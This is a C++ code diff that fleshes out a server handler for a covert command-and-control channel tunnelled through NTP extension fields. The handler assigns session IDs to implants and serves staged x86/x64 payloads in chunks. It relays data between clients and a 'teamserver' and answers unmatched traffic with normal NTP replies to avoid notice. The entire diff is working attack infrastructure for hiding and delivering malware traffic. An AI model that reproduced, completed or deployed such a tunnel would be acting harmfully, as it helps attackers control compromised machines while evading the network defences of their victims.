@@ -4,148 +4,350 @@
 #include <iostream>
 #include <iomanip>
 #include <vector>
+#include <array>
+
 #include "parsentp.hpp"
 #include "helpers.hpp"
 #include "createntp.hpp"
 #include "constants.hpp"
-#include <array>
 #include "client.hpp"
-#include "constants.hpp"
+#include "globals.hpp"
+#include "teamserver.hpp"
 
 void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET sock) {
-    //bug is here, as it was +48 instead of whtaever. Need to get size safely, as well.
-    //safely moving into vector by doing data + len (data is a char* so it's the first item
-    std::vector<uint8_t> packet(data, data + len);
+    // Previously used +48, fixed to use actual packet size safely
+    // Safely move into vector using data + len
+    std::vector<uint8_t> rawPacket(data, data + len);
 
     std::cout << "Received " << len << " bytes from "
         << inet_ntoa(client_addr->sin_addr) << ":"
         << ntohs(client_addr->sin_port) << std::endl;
 
-
-    //0.: Extract client ID and stuff out, do class checks to see if it exstsi, and setup for further action
-    //note, size packet may not contain an id
-
-    //std::cout << "Theoretical Client ID" << generateClientID() << std::endl;
-
-    //1. Run some checks to make sure an extension field exists, and extract it if so
-
-    //2 seperate for different error messages. Could just be the < 52 one as well.
-    if (packet.size() <= 48) {
+    // 1. Basic check for NTP packet size
+    if (rawPacket.size() <= 48) {
         std::cout << "----------------------" << std::endl;
-        std::cout << "PCKT: Normal NTP Packet " << std::endl;
-        std::cout << "----------------------" << std::endl;        //send back a default packet
+        std::cout << "PCKT: Normal NTP Packet" << std::endl;
+        std::cout << "----------------------" << std::endl;
         sendNormalNtpPacket(client_addr, sock);
         return;
     }
 
-    //each packet needs the 4 byte header, so check if there are bytes there
-    if (packet.size() < 52) {
+    // Each packet needs 4-byte header; verify enough data for extension
+    if (rawPacket.size() < 52) {
         std::cout << "----------------------" << std::endl;
-        std::cout << "PCKT: Normal NTP Packet " << std::endl;
+        std::cout << "PCKT: Normal NTP Packet" << std::endl;
         std::cout << "----------------------" << std::endl;
         std::cout << "Packet does not contain an extension field" << std::endl;
-
-        //send back a default packet
         sendNormalNtpPacket(client_addr, sock);
-
         return;
     }
 
-    //Extract extension field
-    NTPPacketParser ntpPacket(packet);
+    // Parse packet
+    NTPPacketParser ntpPacket(rawPacket);
     std::vector<uint8_t> ntpPacketExtension = ntpPacket.getExtension();
     std::array<uint8_t, 2> ntpPacketExtensionField = ntpPacket.getExtensionField();
-    //standard here: print debug header of packet type, then printthe packet
 
-    //2. Do different actions based on what type of packet/extension field is coming in
+    // Extract client ID for session lookup
+    std::vector<uint8_t> clientId = ntpPacket.getExtensionClientId();
+    std::cout << "[?] Client Session ID: ";
+    printHexVector(clientId);
+    std::cout << std::endl;
+
+    // Handle payload request packets
     if (ntpPacketExtensionField == NtpExtensionField::giveMePayload) {
         std::cout << "----------------------" << std::endl;
-        std::cout << "PCKT: Give Me Payload " << std::endl;
+        std::cout << "PCKT: Give Me Payload" << std::endl;
         std::cout << "----------------------" << std::endl;
         printHexVectorPacket(ntpPacket.getRawPacket());
 
-        //temp send back normal packet
-        sendNormalNtpPacket(client_addr, sock);
+        uint8_t payloadArch = 0x00;
+        try {
+            payloadArch = ntpPacketExtension.at(8); // Safe access with bounds check
+        }
+        catch (const std::out_of_range& e) {
+            std::cerr << "Packet too short: " << e.what() << std::endl;
+            return;
+        }
 
+        std::cout << "[?] Payload Arch = 0x"
+            << std::hex << static_cast<int>(payloadArch)
+            << std::dec << std::endl;
+
+        if (payloadArch == 0x86) {
+            std::cout << "[?] X86 Payload Requested" << std::endl;
+            uint32_t uintClientId = vectorToUint32(clientId);
+            printClientIDs(sessions);
+
+            auto it = sessions.find(uintClientId);
+            if (it != sessions.end()) {
+                SOCKET clientSocket = it->second.getSocket();
+
+                std::vector<uint8_t> payload = getx86Payload(clientSocket);
+                it->second.setForClientBuffer(payload);
+
+                std::cout << "[?] Stored payload in client class, size: "
+                    << payload.size();
+
+                std::vector<uint8_t> sizeVector = uint32ToBytes(payload.size());
+                std::cout << "[?] DEBUG: Payload as vector: ";
+                printHexVector(sizeVector);
+
+                NTPPacket newPacketClass;
+                newPacketClass.addExtensionField(
+                    NtpExtensionField::sizePacket,
+                    sizeVector,
+                    Client::emptyClientId
+                );
+
+                sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
+                return;
+            }
+            else {
+                std::cout << "[?] Could not find client class: ";
+                printHexVector(clientId);
+            }
+        }
+        else if (payloadArch == 0x64) {
+            std::cout << "[?] X64 Payload Requested" << std::endl;
+            uint32_t uintClientId = vectorToUint32(clientId);
+            printClientIDs(sessions);
+
+            auto it = sessions.find(uintClientId);
+            if (it != sessions.end()) {
+                SOCKET clientSocket = it->second.getSocket();
+
+                std::vector<uint8_t> payload = getx64Payload(clientSocket);
+                it->second.setForClientBuffer(payload);
+
+                std::cout << "[?] Stored payload in client class, size: "
+                    << payload.size();
+
+                std::vector<uint8_t> sizeVector = uint32ToBytes(payload.size());
+                std::cout << "[?] DEBUG: Payload as vector: ";
+                printHexVector(sizeVector);
+
+                NTPPacket newPacketClass;
+                newPacketClass.addExtensionField(
+                    NtpExtensionField::sizePacket,
+                    sizeVector,
+                    Client::emptyClientId
+                );
+
+                sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
+                return;
+            }
+            else {
+                std::cout << "[?] Could not find client class: ";
+                printHexVector(clientId);
+            }
+        }
+        else if (payloadArch == 0x00) {
+            std::cout << "[?] 0x00 continuation of getting payload" << std::endl;
+
+            uint32_t convertedClientId = vectorToUint32(clientId);
+            std::cout << "[?] Looking up class by key: "
+                << convertedClientId << std::endl;
+
+            auto it = sessions.find(convertedClientId);
+            if (it != sessions.end()) {
+                std::cout << "[?] Class exists for " << convertedClientId << std::endl;
+                std::vector<uint8_t> nextChunk = it->second.getNextChunk(Chunk::maxChunkSize);
+
+                NTPPacket responsePacketClass;
+                responsePacketClass.addExtensionField(
+                    NtpExtensionField::dataFromTeamserver,
+                    nextChunk,
+                    Client::emptyClientId
+                );
+
+                sendNtpPacket(client_addr, sock, responsePacketClass.getPacket());
+            }
+            else {
+                std::cout << "[?] Client Class not found!" << std::endl;
+            }
+        }
+        else {
+            std::cout << "[?] Invalid Payload" << std::endl;
+        }
     }
 
-    if (ntpPacketExtensionField == NtpExtensionField::sizePacket) {
+    // Get ID packet: assigns a new client ID and creates session class
+    else if (ntpPacketExtensionField == NtpExtensionField::getIdPacket) {
         std::cout << "----------------------" << std::endl;
-        std::cout << "PCKT: sizePacket " << std::endl;
+        std::cout << "PCKT: getIdPacket" << std::endl;
         std::cout << "----------------------" << std::endl;
         printHexVectorPacket(ntpPacket.getRawPacket());
-
-        std::cout << "[?] sizePacket recieved, starting chunking" << std::endl;
 
         uint32_t clientID = generateClientID();
-        std::cout << "Theoretical Client ID: " << clientID << std::endl;
+        std::cout << "[?] Client ID: " << clientID << std::endl;
 
-        //placeholder for ID
         std::vector<uint8_t> clientIdVector = uint32ToBytes(clientID);
-        //std::vector<uint8_t> clientIdVector = { 0x00,0x00,0x00,0x00 };
+        ClientSession someClient(clientIdVector);
 
-        //create NTP packet for response, with client ID included
+        sessions.insert({ clientID, someClient });
+        std::cout << "[?] Added Client Session with ID: "
+            << clientID << " to sessions map." << std::endl;
+
         NTPPacket idPacket;
-
         idPacket.addExtensionField(
             NtpExtensionField::idPacket,
-            clientIdVector
+            clientIdVector,
+            Client::emptyClientId
         );
 
-        std::vector<uint8_t> rawPacket = idPacket.getPacket();
-
-        sendNtpPacket(
-            client_addr,
-            sock,
-            rawPacket
-        );
-
-        //pass to chunker func
-        //pass socket, recv from, size, etc.
-
-        //temp send back normal packet
-        //sendNormalNtpPacket(client_addr, sock);
-
+        sendNtpPacket(client_addr, sock, idPacket.getPacket());
     }
 
-    /*
-    dataForTeamserver
+    // Size packet: sets expected inbound message size
+    else if (ntpPacketExtensionField == NtpExtensionField::sizePacket) {
+        std::cout << "----------------------" << std::endl;
+        std::cout << "PCKT: sizePacket" << std::endl;
+        std::cout << "----------------------" << std::endl;
+        printHexVectorPacket(ntpPacket.getRawPacket());
 
-    ...
+        uint32_t uintClientId = vectorToUint32(clientId);
+        std::cout << "[?] Looking up client ID: " << uintClientId << std::endl;
+        auto it = sessions.find(uintClientId);
+        if (it != sessions.end()) {
+            uint32_t uintMessageSize = vectorToUint32(ntpPacket.getExtensionData());
+            it->second.setFromClientBufferSize(uintMessageSize);
 
+            std::cout << "[?] Stored message size in client class, size: "
+                << it->second.getFromClientBufferSize() << std::endl;
 
-    */
+            NTPPacket newPacketClass;
+            newPacketClass.addExtensionField(
+                NtpExtensionField::sizePacketAcknowledge,
+                {},
+                Client::emptyClientId
+            );
+
+            sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
+            return;
+        }
+        else {
+            std::cout << "[?] Could not find client class: ";
+            printHexVector(clientId);
+        }
+    }
+
+    // Data for teamserver: accumulate chunks and forward when complete
     else if (ntpPacketExtensionField == NtpExtensionField::dataForTeamserver) {
         std::cout << "----------------------" << std::endl;
-        std::cout << "PCKT: dataForTeamserver " << std::endl;
+        std::cout << "PCKT: dataForTeamserver" << std::endl;
         std::cout << "----------------------" << std::endl;
-        //this is data meant for teamserver. Need to fogure out chunkinghere too
-
-        //identify session here too?
-        std::cout << "sendDataToTeamserver " << std::endl;
         printHexVectorPacket(ntpPacket.getRawPacket());
 
-        //send to teamserver
+        uint32_t uintClientId = vectorToUint32(clientId);
+        auto it = sessions.find(uintClientId);
+        if (it != sessions.end()) {
+            if (it->second.fromClientBuffer.size() >= it->second.getFromClientBufferSize()) {
+                std::cout << "[!] More data than expected from client" << std::endl;
+                std::cout << "[!] Expected Size: "
+                    << it->second.getFromClientBufferSize()
+                    << " Actual Size: "
+                    << it->second.fromClientBuffer.size() << std::endl;
+            }
 
-        //get data back
+            auto extData = ntpPacket.getExtensionData();
+            it->second.fromClientBuffer.insert(
+                it->second.fromClientBuffer.end(), extData.begin(), extData.end());
 
-        //send data back with header of NtpExtensionField::dataFromTeamserver
+            if (it->second.fromClientBuffer.size() == it->second.getFromClientBufferSize()) {
+                std::cout << "[+] Data from client complete, sending to teamserver" << std::endl;
 
-        //temp send back normal packet
-        sendNormalNtpPacket(client_addr, sock);
+                std::vector<uint8_t> frame =
+                    forwardToTeamserver(it->second.fromClientBuffer, it->second.getSocket());
+
+                it->second.setForClientBuffer(frame);
+                std::cout << "[+] TS comms complete" << std::endl;
+
+                NTPPacket newPacketClass;
+                newPacketClass.addExtensionField(
+                    NtpExtensionField::sizePacketAcknowledge,
+                    {},
+                    Client::emptyClientId
+                );
+
+                sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
+                it->second.fromClientBuffer.clear();
+            }
+        }
+        else {
+            std::cout << "[?] Could not find client class: ";
+            printHexVector(clientId);
+        }
     }
 
+    // Get data from teamserver (client polling)
+    else if (ntpPacketExtensionField == NtpExtensionField::getDataFromTeamserver) {
+        std::cout << "----------------------" << std::endl;
+        std::cout << "PCKT: getDataFromTeamserver" << std::endl;
+        std::cout << "----------------------" << std::endl;
+        printHexVectorPacket(ntpPacket.getRawPacket());
+
+        uint32_t uintClientId = vectorToUint32(clientId);
+        auto it = sessions.find(uintClientId);
+        if (it != sessions.end()) {
+            std::vector<uint8_t> chunkForClient = it->second.getNextChunk(Chunk::maxChunkSize);
+
+            std::cout << "[?] Size of total stored data: "
+                << it->second.getForClientBuffer().size() << std::endl;
+            std::cout << "[?] Size of chunk to send: "
+                << chunkForClient.size() << std::endl;
+
+            NTPPacket newPacketClass;
+            newPacketClass.addExtensionField(
+                NtpExtensionField::dataFromTeamserver,
+                chunkForClient,
+                Client::emptyClientId
+            );
+
+            sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
+        }
+        else {
+            std::cout << "[?] Could not find client class: ";
+            printHexVector(clientId);
+            sendNormalNtpPacket(client_addr, sock);
+        }
+    }
+
+    // Return size of data waiting for client
+    else if (ntpPacketExtensionField == NtpExtensionField::getDataFromTeamserverSize) {
+        std::cout << "----------------------" << std::endl;
+        std::cout << "PCKT: getDataFromTeamserverSize" << std::endl;
+        std::cout << "----------------------" << std::endl;
+        printHexVectorPacket(ntpPacket.getRawPacket());
+
+        uint32_t uintClientId = vectorToUint32(clientId);
+        auto it = sessions.find(uintClientId);
+        if (it != sessions.end()) {
+            std::vector<uint8_t> sizeOfData =
+                uint32ToBytes(it->second.getForClientBuffer().size());
+
+            NTPPacket newPacketClass;
+            newPacketClass.addExtensionField(
+                NtpExtensionField::sizePacket,
+                sizeOfData,
+                Client::emptyClientId
+            );
+
+            sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
+        }
+        else {
+            std::cout << "[?] Could not find client class: ";
+            printHexVector(clientId);
+            sendNormalNtpPacket(client_addr, sock);
+        }
+    }
+
+    // Unknown packet type, reply with default NTP packet
     else {
         std::cout << "----------------------" << std::endl;
-        std::cout << "PCKT: Unknown " << std::endl;
+        std::cout << "PCKT: Unknown" << std::endl;
         std::cout << "----------------------" << std::endl;
-        std::cout << "[?] Packet extension did not match any known extensions" << std::endl;
+        std::cout << "[?] Packet extension did not match known extensions" << std::endl;
         printHexVectorPacket(ntpPacket.getRawPacket());
-
-        //if none of the headers match,s end back regular NTP packet
-        //send back normal packet
         sendNormalNtpPacket(client_addr, sock);
-
     }
-
 }
